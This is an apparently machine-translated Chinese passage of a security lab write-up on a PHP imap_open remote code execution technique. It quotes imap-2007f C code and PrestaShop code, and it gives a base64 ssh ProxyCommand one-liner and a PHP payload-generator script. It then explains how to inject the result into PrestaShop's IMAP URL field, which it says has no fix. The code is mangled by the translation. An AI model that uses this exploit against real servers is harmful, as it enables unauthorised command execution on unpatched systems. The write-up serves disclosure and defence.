    594: RSHPATH=/usr/bin/rsh \
    …
    673: slx: # Secure Linux
    …
    681: RSHPATH=/usr/bin/rsh \
我把Debian 9作为我的测试环境，我有/ usr / bin / rsh作为RSHPATH，这是我的情况下ssh二进制文件的链接。
返回tcp_aopen并观察定义后会发生什么。
/imap-2007f/src/osdep/unix/tcp_unix.c：
    347: if (*service == ‘*’) { /* want ssh? */
    348: /* return immediately if ssh disabled */
    349: if (!(sshpath && (ti = sshtimeout))) return NIL;
    350: /* ssh command prototype defined yet? */
    351: if (!sshcommand) sshcommand = cpystr (“%s %s -l %s exec /etc/r%sd”);
    352: }
    353: /* want rsh? */
    354: else if (rshpath && (ti = rshtimeout)) {
    355: /* rsh command prototype defined yet? */
    356: if (!rshcommand) rshcommand = cpystr (“%s %s -l %s exec /etc/r%sd”);
    357: }
    358: else return NIL; /* rsh disabled */
该代码生成一个命令以在远程服务器上执行rimapd二进制文件。让我们创建一个PHP脚本进行测试。
test1.php：
    1:  ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo =
    ssh -oProxyCommand =“echo ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo = | base64 -d | bash”localhost
工作很棒！是时候在PHP中测试它了。
test2.php：
    1：syncImap();
    …
    0966: public function syncImap()
    0967: {
    0968: if (!($url = Configuration::get(‘PS_SAV_IMAP_URL’))
    0969: || !($port = Configuration::get(‘PS_SAV_IMAP_PORT’))
    0970: || !($user = Configuration::get(‘PS_SAV_IMAP_USER’))
    0971: || !($password = Configuration::get(‘PS_SAV_IMAP_PWD’))) {
    0972: return array(‘hasError’ => true, ‘errors’ => array(‘IMAP configuration is not correct’));
    0973: }
    0974:
    0975: $conf = Configuration::getMultiple(array(
    0976: ‘PS_SAV_IMAP_OPT_POP3’, ‘PS_SAV_IMAP_OPT_NORSH’, ‘PS_SAV_IMAP_OPT_SSL’,
    0977: ‘PS_SAV_IMAP_OPT_VALIDATE-CERT’, ‘PS_SAV_IMAP_OPT_NOVALIDATE-CERT’,
    0978: ‘PS_SAV_IMAP_OPT_TLS’, ‘PS_SAV_IMAP_OPT_NOTLS’));
    …
    1007: $mbox = @imap_open(‘{‘.$url.’:’.$port.$conf_str.’}’, $user, $password);
你可以在这里看到imap_open调用用户数据$ url变量。
我将以前的脚本更新为PHP上的一个小负载生成器。它需要您想要作为参数执行的命令。
payload.php：
    1：<？php 
    2：$ payload = $ argv [1]; 
    3：$ encoded_pa​​yload = base64_encode（$ payload）; 
    4：$ server =“any -o ProxyCommand = echo \ t”。$ encoded_pa​​yload。“| base64 \ td | bash}”; 
    5：print（“payload：{$ server}”。PHP_EOL）;
将生成的有效payload插入URL输入并按保存。
瞧！远程执行代码漏洞就在这里。
结论  
今天，我们了解了一种绕过安全限制并实现远程代码执行漏洞的新技术。看看在PrestaShop软件上使用它的真实世界示例，该软件仍然没有可以解决问题的版本。但是，PHP开发人员已经发布了针对此问题的补丁。不幸的是，Linux发行版中的存储库和软件包并没有像我们所喜欢的那样快速更新。
注意并尝试在项目中避免不安全的imap_open函数调用。
有一个很好的bug赏金;）
`原文链接:https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb`